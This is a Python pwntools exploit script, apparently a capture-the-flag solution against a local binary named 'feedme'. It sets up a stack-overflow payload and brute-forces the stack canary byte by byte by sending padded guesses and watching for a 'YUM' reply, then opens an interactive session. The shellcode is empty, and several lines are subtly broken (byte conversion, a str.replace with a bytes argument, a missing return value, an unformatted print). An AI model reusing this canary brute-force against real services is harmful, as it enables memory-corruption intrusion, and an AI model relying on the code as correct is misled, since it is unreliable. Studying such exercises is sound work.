from pwn import *


# ------ Setup ------
# -------------------

io = process('./feedme')
#io = gdb.debug('./feedme')

# ---- Variables ----
# -------------------

canary = b"\x00"

shellcode_32 = b""

nops = b"\x90"*0

offset = 0x30
offset_canary = 0x20

padding = b"A"* (offset - len(nops) - len(shellcode_32))

payload = nops + shellcode_32 + padding

# -- Exploit --
# ---------------

def checkCanary():
    known_canary = b"\x00"
    hex_canary = "00"
    canary = 0x0
    input_bytes = 0x22

    for h in range(3):
        for i in range(0xff):
            print("Trying:" + hex(canary))


            io.send(p32(input_bytes))
            payload = b"0"*0x20
            payload += bytes(known_canary)
            payload += bytes(p32(canary)[0])
            io.send(payload)
            output = io.recvuntil(b"exit.")
            print("INITIAL")
            if b"YUM" in output:
                print("IF")
                print("next byte is: " + hex(canary))
                known_canary = known_canary + p32(canary)[0]
                input_bytes = input_bytes + 1
                new_canary = hex(canary)
                new_canary = new_canary.replace(b"0x",b"")
                hex_canary = new_canary + hex_canary
                canary = 0x0
                break
            else:
                print("ELSE")
                canary = canary + 0x1

    print("FIN")
    #return int(hex_canary, 16)

canary = checkCanary()
print("The canary is: {canary}")

io.interactive()
